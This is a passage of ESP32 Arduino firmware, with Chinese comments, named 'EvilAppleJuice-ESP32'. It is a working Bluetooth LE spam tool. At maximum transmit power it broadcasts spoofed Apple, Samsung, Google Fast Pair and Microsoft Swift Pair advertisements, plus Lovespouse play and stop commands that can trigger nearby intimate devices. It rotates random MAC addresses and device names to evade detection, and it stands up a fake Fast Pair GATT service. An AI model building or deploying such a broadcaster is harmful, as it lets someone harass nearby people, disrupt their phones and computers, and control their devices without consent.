    s_deviceList[idx].data     = &SWIFT_PAIR_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_PC_MICROSOFT_SWIFT_PAIR;
  }
  s_categoryCounts[DEVICE_PC_MICROSOFT_SWIFT_PAIR] = idx - s_categoryStartIdx[DEVICE_PC_MICROSOFT_SWIFT_PAIR];
  LOG("    [电脑-Windows] 加载 %d 个设备", s_categoryCounts[DEVICE_PC_MICROSOFT_SWIFT_PAIR]);

  LOG(">>> 电脑设备总计: %d 个", s_categoryCounts[DEVICE_PC_MICROSOFT_SWIFT_PAIR]);

  // ========== 第四组：其他设备（3个子类别） ==========
  LOG(">>> 加载其他设备...");

  // ========== 第四组：其他设备 ==========
/*
// Custom（自定义设备 - 已迁移到 ALL_DEVICES）
s_categoryStartIdx[DEVICE_OTHER_CUSTOM] = idx;
for (int i = 0; i < NUM_CUSTOM_DEVICES && idx < MAX_DEVICES; i++, idx++) {
  s_deviceList[idx].name     = CUSTOM_DEVICES[i].name;
  s_deviceList[idx].filler   = fillCustomPacket;
  s_deviceList[idx].data     = &CUSTOM_DEVICES[i];
  s_deviceList[idx].pduType  = 1;
  s_deviceList[idx].category = DEVICE_OTHER_CUSTOM;
}
s_categoryCounts[DEVICE_OTHER_CUSTOM] = idx - s_categoryStartIdx[DEVICE_OTHER_CUSTOM];
LOG("    [其他-自定义] 加载 %d 个设备", s_categoryCounts[DEVICE_OTHER_CUSTOM]);
*/

  // Lovespouse Play（播放指令）
  s_categoryStartIdx[DEVICE_OTHER_LOVESPOUSE_PLAY] = idx;
  for (int i = 0; i < NUM_LOVESPOUSE_PLAY_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = LOVESPOUSE_PLAY_DEVICES[i].name;
    s_deviceList[idx].filler   = fillLovespousePacket;
    s_deviceList[idx].data     = &LOVESPOUSE_PLAY_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_OTHER_LOVESPOUSE_PLAY;
  }
  s_categoryCounts[DEVICE_OTHER_LOVESPOUSE_PLAY] = idx - s_categoryStartIdx[DEVICE_OTHER_LOVESPOUSE_PLAY];
  LOG("    [其他-Lovespouse播放] 加载 %d 个设备", s_categoryCounts[DEVICE_OTHER_LOVESPOUSE_PLAY]);

  // Lovespouse Stop（停止指令）
  s_categoryStartIdx[DEVICE_OTHER_LOVESPOUSE_STOP] = idx;
  for (int i = 0; i < NUM_LOVESPOUSE_STOP_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = LOVESPOUSE_STOP_DEVICES[i].name;
    s_deviceList[idx].filler   = fillLovespousePacket;
    s_deviceList[idx].data     = &LOVESPOUSE_STOP_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_OTHER_LOVESPOUSE_STOP;
  }
  s_categoryCounts[DEVICE_OTHER_LOVESPOUSE_STOP] = idx - s_categoryStartIdx[DEVICE_OTHER_LOVESPOUSE_STOP];
  LOG("    [其他-Lovespouse停止] 加载 %d 个设备", s_categoryCounts[DEVICE_OTHER_LOVESPOUSE_STOP]);

  // 统计其他设备总数
  int otherTotal = 0;
  for (int c = CATEGORY_OTHER_START; c <= CATEGORY_OTHER_END; c++) otherTotal += s_categoryCounts[c];
  LOG(">>> 其他设备总计: %d 个", otherTotal);

  // 更新设备总数
  s_totalDevices = idx;

  // 初始化大类分组信息（计算每个大类的设备总数）
  for (int i = 0; i < NUM_GROUPS; i++) {
    s_categoryGroups[i].totalCount = 0;
    for (int c = s_categoryGroups[i].startCategory; c <= s_categoryGroups[i].endCategory; c++) {
      s_categoryGroups[i].totalCount += s_categoryCounts[c];
    }
    s_categoryGroups[i].currentIdx = 0;  // 重置当前轮询位置
  }

  // ==================== 预计算设备映射表（O(1)查找优化） ====================
  // 将每个大类内的设备索引预先计算并存储到映射表中
  // 这样在 performBroadcast 中可以直接通过 groupIdx 和 offset 获取设备在 s_deviceList 中的索引
  for (int groupIdx = 0; groupIdx < NUM_GROUPS; groupIdx++) {
    CategoryGroup& group = s_categoryGroups[groupIdx];
    int mapOffset = 0;  // 当前大类在映射表中的偏移
    for (int c = group.startCategory; c <= group.endCategory; c++) {
      int catCount = s_categoryCounts[c];
      int catStart = s_categoryStartIdx[c];
      for (int i = 0; i < catCount && mapOffset < MAX_DEVICES; i++) {
        s_groupDeviceMap[groupIdx][mapOffset++] = catStart + i;
      }
    }
  }

  // 输出设备加载完成日志
  LOG("========================================");
  LOG("设备加载完成! 总计: %d 个设备", s_totalDevices);
  LOG("  - 苹果设备: %d 个", s_categoryGroups[0].totalCount);
  LOG("  - 安卓设备: %d 个", s_categoryGroups[1].totalCount);
  LOG("  - 电脑设备: %d 个", s_categoryGroups[2].totalCount);
  LOG("  - 其他设备: %d 个", s_categoryGroups[3].totalCount);
  LOG("========================================");
}

// ==================== 设置满功率发射 ====================
// 将所有 BLE 功率类型设置为最大值，确保广播覆盖范围最大
// 包括：默认功率、广播功率、扫描功率、连接句柄功率
static void setMaxTxPower() {
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, MAX_TX_POWER_LVL);  // 默认功率
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV,     MAX_TX_POWER_LVL);  // 广播功率
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN,    MAX_TX_POWER_LVL);  // 扫描功率
  // 设置所有连接句柄的功率（共9个）
  for (int i = ESP_BLE_PWR_TYPE_CONN_HDL0; i <= ESP_BLE_PWR_TYPE_CONN_HDL8; i++) {
    esp_ble_tx_power_set(static_cast<esp_ble_power_type_t>(i), MAX_TX_POWER_LVL);
  }
}

// ==================== LED 状态控制（设备类别指示） ====================
// 根据当前广播的设备类别控制 LED 状态，便于肉眼识别当前正在广播的设备类型
// 苹果设备：右灯亮
// 安卓设备：左灯亮
// 电脑设备：左灯亮
// 其他设备：两灯都亮
static void setLedState(DeviceCategory category) {
#if LED_ENABLE == 1
  if (category >= CATEGORY_APPLE_START && category <= CATEGORY_APPLE_END) {
    LED_OFF(LEFT_LED_GPIO);
    LED_ON(RIGHT_LED_GPIO);
  }
  else if (category >= CATEGORY_ANDROID_START && category <= CATEGORY_ANDROID_END) {
    LED_ON(LEFT_LED_GPIO);
    LED_OFF(RIGHT_LED_GPIO);
  }
  else if (category == DEVICE_PC_MICROSOFT_SWIFT_PAIR) {
    LED_ON(LEFT_LED_GPIO);
    LED_OFF(RIGHT_LED_GPIO);
  }
  else {
    LED_ON(LEFT_LED_GPIO);
    LED_ON(RIGHT_LED_GPIO);
  }
#endif
}

// ==================== 广播轮次完成 LED 闪烁指示 ====================
// 一轮广播完成后，LED 交替闪烁2次，表示轮次结束
static void flashRoundComplete() {
#if LED_ENABLE == 1
  for (int i = 0; i < 2; i++) {
    LED_ON(LEFT_LED_GPIO);
    LED_OFF(RIGHT_LED_GPIO);
    esp_rom_delay_us(30000);   // 亮30ms（使用 esp_rom_delay_us 避免阻塞调度器）
    LED_OFF(LEFT_LED_GPIO);
    LED_ON(RIGHT_LED_GPIO);
    esp_rom_delay_us(30000);   // 亮30ms
  }
  LED_OFF(LEFT_LED_GPIO);
  LED_OFF(RIGHT_LED_GPIO);
#endif
}

// ==================== BLE 初始化（带重试机制） ====================
// 在射频干扰下，esp_bt_controller_init() 可能返回 ESP_ERR_BT_NO_MEM
// 因此需要实现重试机制，最多重试 BLE_INIT_RETRY_MAX 次
// 每次重试间隔 100ms（50ms disable + 50ms enable）
static bool initBLE() {
  int retry = 0;
  while (retry < BLE_INIT_RETRY_MAX) {
    // 先禁用再启用 BLE 控制器，确保状态干净
    esp_bt_controller_disable();
    delay(50);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    delay(50);

    // 初始化 BLE 设备（设备名为空，后续动态设置）
    BLEDevice::init("");
    esp_ble_gap_set_device_name("");

    // 创建 BLE Server（虽然我们只做广播，但需要 Server 对象获取 Advertising）
  s_pServer = BLEDevice::createServer();
if (!s_pServer) { retry++; continue; }
s_advertising = s_pServer->getAdvertising();// 获取广播控制器

    // 获取广播控制器
    //s_advertising = pServer->getAdvertising();
    if (!s_advertising) { retry++; continue; }

    // 设置广播间隔（0x00A4 = 128.75ms，避免 iOS Coalescing）
    s_advertising->setMinInterval(ADV_MIN_INTERVAL);
    s_advertising->setMaxInterval(ADV_MAX_INTERVAL);

    // 设置初始随机 MAC 地址
    esp_bd_addr_t init_addr;
    generateRandomMac(init_addr);
    s_advertising->setDeviceAddress(init_addr, BLE_ADDR_TYPE_RANDOM);

    // 设置最大功率发射
    setMaxTxPower();
    LOG("BLE initialized (attempt %d)", retry + 1);
    return true;
  }

  // 所有重试都失败，记录错误日志
  LOG("FATAL: BLE init failed after %d retries", BLE_INIT_RETRY_MAX);
  return false;
}

#define ROUND_DELAY_MS 3000  // 每轮广播完成后的休息时间（3秒）

// ==================== 在大类中查找下一个设备索引（O(1)查找） ====================
// 通过预计算的映射表 s_groupDeviceMap 直接获取设备索引
// 时间复杂度为 O(1)，消除了运行时循环查找
// 返回值: 设备在 s_deviceList 中的索引，-1 表示该大类已遍历完毕
static inline int findNextDeviceInGroup(int groupIdx, int currentGroupIndex) {
  CategoryGroup& group = s_categoryGroups[groupIdx];
  if (currentGroupIndex >= group.totalCount) {
    return -1;  // 该大类已遍历完毕
  }
  return s_groupDeviceMap[groupIdx][currentGroupIndex];  // 直接查表获取索引
}

// ==================== 执行单次广播（核心轮询逻辑） ====================
// 每次调用执行一个设备的广播
// 使用轮次轮转算法实现真正的交错轮询（苹果→安卓→电脑→其他→苹果→安卓...）
// 当某大类设备数多于其他大类时，通过多次轮转到该大类实现均匀分布
static esp_bd_addr_t s_adv_addr;
static bool s_addr_initialized = false;
// ==================== 执行单次广播（核心轮询逻辑） ====================

static void performBroadcast() {
    if (!s_isInitialized || !s_advertising || s_totalDevices <= 0) return;

    bool isNewRound = (s_devicesBroadcastThisRound == 0);
    if (isNewRound) {
        s_roundCount++;
        for (int i = 0; i < NUM_GROUPS; i++) {
            s_groupCurrentIdx[i] = 0;
        }
        s_globalRoundIdx = 0;
        LOG("========== 开始第 %d 轮广播 ==========", s_roundCount);
        LOG("本轮将广播 %d 个设备，预计耗时: %.1f 秒",
            s_totalDevices,
            s_totalDevices * 0.3f + 3.0f);   // 直接秒
    }

    int targetGroupIdx = -1;
    int targetDeviceIdx = -1;
    int searchAttempts = 0;
    while (searchAttempts < NUM_GROUPS * 2) {
        int groupIdx = s_globalRoundIdx % NUM_GROUPS;
        s_globalRoundIdx++;
        if (s_groupCurrentIdx[groupIdx] < s_categoryGroups[groupIdx].totalCount) {
            targetGroupIdx = groupIdx;
            targetDeviceIdx = findNextDeviceInGroup(groupIdx, s_groupCurrentIdx[groupIdx]);
            break;
        }
        searchAttempts++;
    }

    if (targetGroupIdx < 0 || targetDeviceIdx < 0) return;

    const DeviceDesc& desc = s_deviceList[targetDeviceIdx];

    // ========== 类别标志 ==========
    bool isApple = (desc.category >= CATEGORY_APPLE_START && desc.category <= CATEGORY_APPLE_END);
    bool isSamsung = (desc.category == DEVICE_ANDROID_SAMSUNG_BUDS || desc.category == DEVICE_ANDROID_SAMSUNG_WATCH);
    bool isFastPair = (desc.category >= DEVICE_ANDROID_FAST_PAIR && desc.category <= DEVICE_ANDROID_FAST_PAIR_PHONE);
    bool isLovespouse = (desc.category == DEVICE_OTHER_LOVESPOUSE_PLAY || desc.category == DEVICE_OTHER_LOVESPOUSE_STOP);

    LOG_DEVICE(s_categoryNames[desc.category], desc.name, s_devicesBroadcastThisRound + 1, s_totalDevices);

    // ========== 设置广播参数 ==========
    generateRandomMac(s_adv_addr);
    s_advertising->setDeviceAddress(s_adv_addr, BLE_ADDR_TYPE_RANDOM);

    updateRandomDeviceName();

    BLEAdvertisementData ad;
    desc.filler(ad, desc.data);

    // 三星 Buds 扫描响应
    if (desc.category == DEVICE_ANDROID_SAMSUNG_BUDS) {
        BLEAdvertisementData scanRsp;
        uint8_t scanData[] = {
            0x10, 0xFF, 0x75, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };
        scanRsp.addData(std::string(reinterpret_cast<char*>(scanData), sizeof(scanData)));
        s_advertising->setScanResponseData(scanRsp);
    }

    // Fast Pair 添加 Service UUID
    if (isFastPair) {
        uint8_t serviceUUID_AD[] = {0x03, 0x03, 0x2C, 0xFE};
        ad.addData(std::string(reinterpret_cast<const char*>(serviceUUID_AD), sizeof(serviceUUID_AD)));
    }

    setOptimalPduType(s_advertising, desc.pduType);
    s_advertising->setAdvertisementData(ad);

    // ========== 广播执行策略（每个分支独立管理 start/stop） ==========
    if (isLovespouse) {
        // 强力连发：10次 × 30ms，间隔 5ms，总耗时约 350ms
        for (int i = 0; i < 10; i++) {
            s_advertising->start();
            esp_rom_delay_us(30000);
            s_advertising->stop();
            esp_rom_delay_us(5000);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    else if (isFastPair) {
        // 长持 300~500ms，足够 Android 连接
        uint32_t duration = 300 + (fastRandom() % 200);
        s_advertising->start();
        vTaskDelay(pdMS_TO_TICKS(duration));
        s_advertising->stop();
    }
    else if (isApple || isSamsung) {
        // 短促连发 3 次，总耗时 280ms
        for (int i = 0; i < 3; i++) {
            s_advertising->start();
            esp_rom_delay_us(80000);
            s_advertising->stop();
            esp_rom_delay_us(20000);
        }
    }
    else {
        // 其他设备（Swift Pair 等）单次广播 100ms
        s_advertising->start();
        vTaskDelay(pdMS_TO_TICKS(100));
        s_advertising->stop();
    }

    // ========== LED 指示（已禁用） ==========
    setLedState(desc.category);
    LED_OFF(LEFT_LED_GPIO);
    LED_OFF(RIGHT_LED_GPIO);

    // ========== 设备间随机间隔（10~30ms，防碰撞） ==========
    uint32_t gapMs = 10 + (fastRandom() % 20);
    vTaskDelay(pdMS_TO_TICKS(gapMs));

    // ========== 更新索引 ==========
    s_groupCurrentIdx[targetGroupIdx]++;
    s_devicesBroadcastThisRound++;

    // ========== 检测轮次是否完成 ==========
    bool allDone = true;
    for (int i = 0; i < NUM_GROUPS; i++) {
        if (s_groupCurrentIdx[i] < s_categoryGroups[i].totalCount) {
            allDone = false;
            break;
        }
    }

    if (allDone) {
        flashRoundComplete();
        LOG("========== 第 %d 轮广播完成 ==========", s_roundCount);
        LOG("本轮统计:");
        LOG("  - 苹果设备: %d 个", s_categoryGroups[0].totalCount);
        LOG("  - 安卓设备: %d 个", s_categoryGroups[1].totalCount);
        LOG("  - 电脑设备: %d 个", s_categoryGroups[2].totalCount);
        LOG("  - 其他设备: %d 个", s_categoryGroups[3].totalCount);
        LOG("休息 %d 秒后开始下一轮...", ROUND_DELAY_MS / 1000);
        s_devicesBroadcastThisRound = 0;
        vTaskDelay(pdMS_TO_TICKS(ROUND_DELAY_MS));
    }
}

// ==================== setup 初始化（Arduino入口函数） ====================
// 系统启动时执行一次，完成串口、LED、BLE、设备列表的初始化
void setup() {
  // 初始化串口日志（如果启用）
#if ENABLE_LOG == 1
  Serial.begin(115200);
  delay(100);  // 等待串口就绪
  LOG("========================================");
  LOG("  EvilAppleJuice-ESP32 BLE 广播器");
  LOG("  版本: 全协议支持版");
  LOG("  日志: 已开启");
  LOG("========================================");
#endif

  // 初始化 LED 引脚（设置为输出模式，默认熄灭）
  gpio_set_direction(LEFT_LED_GPIO,  GPIO_MODE_OUTPUT);
  gpio_set_direction(RIGHT_LED_GPIO, GPIO_MODE_OUTPUT);
  LED_OFF(LEFT_LED_GPIO);
  LED_OFF(RIGHT_LED_GPIO);

  // LED 自检（闪烁一次表示系统启动）
#if LED_ENABLE == 1
  LED_ON(LEFT_LED_GPIO);
  LED_ON(RIGHT_LED_GPIO);
  delay(200);
  LED_OFF(LEFT_LED_GPIO);
  LED_OFF(RIGHT_LED_GPIO);
#endif

  // 初始化随机数种子（使用硬件随机数生成器，提高反侦测效果）
  s_rngState = esp_random();

  // 初始化 BLE 控制器（带重试机制）
  LOG("正在初始化 BLE...");
  if (!initBLE()) {
    // BLE 初始化失败，进入错误状态（LED 交替闪烁）
    LOG("BLE 初始化失败!");
    while (1) {
      LED_ON(LEFT_LED_GPIO);
      delay(100);
      LED_OFF(LEFT_LED_GPIO);
      LED_ON(RIGHT_LED_GPIO);
      delay(100);
      LED_OFF(RIGHT_LED_GPIO);
    }
  }

  // BLE 初始化成功，加载设备列表
  LOG("BLE 初始化成功!");
  LOG("正在加载设备列表...");

  initDeviceList();
  s_isInitialized = true;  // 标记系统初始化完成
 
// 必须在 BLEDevice 初始化之后调用
  // ========== Fast Pair 标准 GATT 服务（完整 128-bit 特性） ==========
  if (s_pServer) {
      // 1. 创建 Fast Pair 主服务（使用规范 UUID）
      BLEService* pFpService = s_pServer->createService(BLEUUID("FE2C1233-8366-4814-8EB0-01DE32100BEA"));
      if (pFpService) {
          // 特性1：Model ID（只读）
          BLECharacteristic* pModelChar = pFpService->createCharacteristic(
              BLEUUID("FE2C1233-8366-4814-8EB0-01DE32100BEA"),
              BLECharacteristic::PROPERTY_READ
          );
          uint8_t modelId[3] = {0x8A, 0x8F, 0x23};  // 示例：WF-1000XM5，可后期动态
          pModelChar->setValue(modelId, 3);
          
          // 特性2：Key-based Pairing（可写 + 指示）—— 核心
          BLECharacteristic* pKeyChar = pFpService->createCharacteristic(
              BLEUUID("FE2C1234-8366-4814-8EB0-01DE32100BEA"),
              BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_INDICATE
          );
          // 即使不处理写回调，特性存在即可

          // 特性3：Passkey（可写）
          BLECharacteristic* pPasskeyChar = pFpService->createCharacteristic(
              BLEUUID("FE2C1235-8366-4814-8EB0-01DE32100BEA"),
              BLECharacteristic::PROPERTY_WRITE
          );

          // 特性4：Account Key（可写）
          BLECharacteristic* pAccountKeyChar = pFpService->createCharacteristic(
              BLEUUID("FE2C1236-8366-4814-8EB0-01DE32100BEA"),
              BLECharacteristic::PROPERTY_WRITE
          );

          pFpService->start();
          LOG("Fast Pair 标准 GATT 服务已创建");
      } else {
          LOG("警告：创建 Fast Pair 标准服务失败");
      }
  } else {
      LOG("错误：s_pServer 为空");
      while (1) delay(1000);
  }
  // ============================================================
// 注意：千万不要在这里调用 pServer->getAdvertising()->start()，
// 因为主循环的 performBroadcast() 会全权负责广播的开启和关闭。
// =====================================================

  // 输出初始化完成日志和广播参数
  LOG("系统初始化完成，开始广播...");
  LOG("广播参数:");
  LOG("  - 广播延时: %d-%d ms", BROADCAST_DELAY_MIN_MS, BROADCAST_DELAY_MAX_MS);
  LOG("  - 轮间隔: %d 秒", ROUND_DELAY_MS / 1000);
  LOG("  - 发射功率: 最大");
  LOG("========================================");
}

// ==================== loop 主循环（Arduino主循环） ====================
// 系统初始化完成后，不断调用此函数执行广播
// 每次调用执行一个设备的广播，循环往复
void loop() {
  performBroadcast();
}
